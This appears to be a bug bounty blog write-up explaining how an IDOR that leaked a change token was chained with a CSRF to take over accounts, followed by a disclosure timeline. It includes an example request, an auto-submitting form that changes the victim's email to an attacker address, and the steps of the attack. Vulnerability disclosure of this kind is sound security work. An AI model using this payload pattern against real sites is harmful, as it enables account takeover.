---
title: "Chaining IDOR + CSRF for Account Takeover"
date: 2024-08-12
tags: ["vuln", "web", "writeup"]
summary: "A walkthrough of how I chained an insecure direct object reference with a CSRF vulnerability to achieve full account takeover on a bug bounty target."
---

## Overview

During a private bug bounty program I found two medium-severity issues that, individually, were unremarkable. Chained together they became a critical — full account takeover with no user interaction beyond visiting an attacker-controlled page.

## The IDOR

The `/api/v1/user/settings` endpoint accepted a `uid` parameter and returned account settings for that user without checking whether the authenticated session owned that account.

```http
GET /api/v1/user/settings?uid=1337 HTTP/1.1
Host: target.example
Cookie: session=<victim_session>
```

The response included the user's email, phone, and a `change_token` used for sensitive operations.

## The CSRF

The email-change flow used a form with no CSRF token. The only protection was a `Referer` header check — which browsers omit on cross-origin navigations when `Referrer-Policy: no-referrer` is set.

```html
<meta name="referrer" content="no-referrer">
<form action="https://target.example/api/v1/user/email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="change_token" value="FETCHED_VIA_IDOR">
</form>
<script>document.forms[0].submit();</script>
```

## The Chain

1. Victim visits attacker page.
2. Page fetches `change_token` via the IDOR (cross-origin read works because the endpoint had a permissive CORS policy).
3. Page immediately POSTs the email-change form with the stolen token, no `Referer` sent.
4. Attacker triggers a password reset to the new email.

## Impact

Full account takeover. Zero clicks required after the initial page visit.

## Timeline

- **2024-07-01** — Reported
- **2024-07-08** — Triaged as Critical
- **2024-07-22** — Fixed (CSRF token added, CORS tightened, IDOR patched)
- **2024-08-12** — Disclosed
